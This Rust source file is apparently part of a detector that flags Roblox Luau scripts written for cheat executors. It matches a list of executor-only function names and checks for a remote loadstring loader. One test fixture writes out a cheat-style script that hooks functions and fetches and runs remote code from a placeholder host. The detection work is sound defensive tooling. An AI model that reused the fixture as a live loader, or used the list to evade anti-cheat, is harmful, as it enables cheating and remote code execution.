// SPDX-FileCopyrightText: 2026 B.O.P.E Scanner contributors
// SPDX-License-Identifier: GPL-3.0-or-later
// Part of B.O.P.E Scanner, a modified version of aeterna-rongroi. Using it to evade detection is out of scope — see AGENTS.md.

//! Which executor-only functions a Lua or Luau script calls — never the script (B.O.P.E, ADR 0108).
//!
//! Roblox runs game scripts in a sandboxed Luau environment. A family of functions exists **only**
//! inside third-party script executors — the community "Unified Naming Convention" names them:
//! `getgenv`, `hookfunction`, `getrawmetatable`, `fireclickdetector`, `Drawing.new` and so on — and
//! `game:HttpGet`, which is not a Roblox API at all, is how executor scripts download and `loadstring`
//! other scripts. A file that calls several of them was written for an executor.
//!
//! The text is scanned once and dropped: what comes back is which markers appeared (from the fixed list
//! below) and how many distinct ones, so a report never carries a line of the script. Matching is on
//! identifier boundaries and ignores ASCII case only where Lua does not (it never does), so `getgenv`
//! inside `mygetgenvHelper` does not count.
//!
//! **What it does not show.** That the script was run, by whom, or against which game. Script
//! collections are shared as text files, and people studying them — including anti-cheat developers —
//! keep copies.

/// The markers, each with the identifier text searched for.
pub const MARKERS: [&str; 30] = [
    "checkcaller",
    "decompile",
    "Drawing.new",
    "fireclickdetector",
    "fireproximityprompt",
    "firetouchinterest",
    "game:HttpGet",
    "game:HttpGetAsync",
    "getcallingscript",
    "getconnections",
    "getcustomasset",
    "getgc",
    "getgenv",
    "getnamecallmethod",
    "getrawmetatable",
    "getreg",
    "getrenv",
    "getsenv",
    "hookfunction",
    "hookmetamethod",
    "identifyexecutor",
    "isexecutorclosure",
    "newcclosure",
    "queue_on_teleport",
    "request",
    "setfflag",
    "sethiddenproperty",
    "setrawmetatable",
    "setreadonly",
    "syn.request",
];

/// Markers that also name an ordinary Lua or Roblox identifier often enough that they never count
/// on their own toward [`ScriptMarkers::distinct`]: `request` is a common variable name.
const WEAK: [&str; 1] = ["request"];

/// What one script was found to call.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct ScriptMarkers {
    /// The markers that appeared, in [`MARKERS`] order.
    pub found: Vec<&'static str>,
    /// How many of them are not weak markers.
    pub distinct: usize,
    /// Whether the text calls `loadstring` with something fetched by `game:HttpGet` on one line, the
    /// shape executor script loaders take.
    pub remote_loadstring: bool,
}

fn is_ident(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || byte == b'_'
}

/// Whether `needle` appears in `haystack` with no identifier character immediately before or after.
fn contains_word(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || haystack.len() < needle.len() {
        return false;
    }
    let mut start = 0;
    while start + needle.len() <= haystack.len() {
        let Some(offset) = haystack[start..]
            .windows(needle.len())
            .position(|window| window == needle)
        else {
            return false;
        };
        let at = start + offset;
        let before_ok = at == 0 || !is_ident(haystack[at - 1]);
        let end = at + needle.len();
        let after_ok = end == haystack.len() || !is_ident(haystack[end]);
        if before_ok && after_ok {
            return true;
        }
        start = at + 1;
    }
    false
}

/// Scans one script's bytes. Never fails: bytes that are not text simply match nothing.
pub fn scan(bytes: &[u8]) -> ScriptMarkers {
    let mut found = Vec::new();
    for marker in MARKERS {
        if contains_word(bytes, marker.as_bytes()) {
            found.push(marker);
        }
    }
    let distinct = found.iter().filter(|m| !WEAK.contains(m)).count();
    let remote_loadstring = bytes.split(|b| *b == b'\n').any(|line| {
        contains_word(line, b"loadstring")
            && (contains_word(line, b"game:HttpGet") || contains_word(line, b"game:HttpGetAsync"))
    });
    ScriptMarkers {
        found,
        distinct,
        remote_loadstring,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_executor_script_shows_its_markers_and_loader_shape() {
        let script = br#"
local env = getgenv()
local mt = getrawmetatable(game)
setreadonly(mt, false)
hookfunction(print, newcclosure(function(...) end))
loadstring(game:HttpGet("https://example.invalid/hub.lua"))()
"#;
        let markers = scan(script);
        assert!(markers.remote_loadstring);
        assert_eq!(
            markers.found,
            vec![
                "game:HttpGet",
                "getgenv",
                "getrawmetatable",
                "hookfunction",
                "newcclosure",
                "setreadonly"
            ]
        );
        assert_eq!(markers.distinct, 6);
    }

    #[test]
    fn ordinary_roblox_code_matches_nothing() {
        let script = br#"
local HttpService = game:GetService("HttpService")
local request = HttpService:RequestAsync({Url = "https://example.invalid"})
local function mygetgenvHelper() return getgenvironment end
print(request)
"#;
        let markers = scan(script);
        assert_eq!(markers.found, vec!["request"]);
        assert_eq!(markers.distinct, 0);
        assert!(!markers.remote_loadstring);
    }

    #[test]
    fn binary_and_empty_input_never_panic() {
        assert_eq!(scan(&[]), ScriptMarkers::default());
        assert_eq!(scan(&[0xFF, 0xFE, 0x00, 0x01]).distinct, 0);
        assert!(!contains_word(b"ab", b"abc"));
    }
}
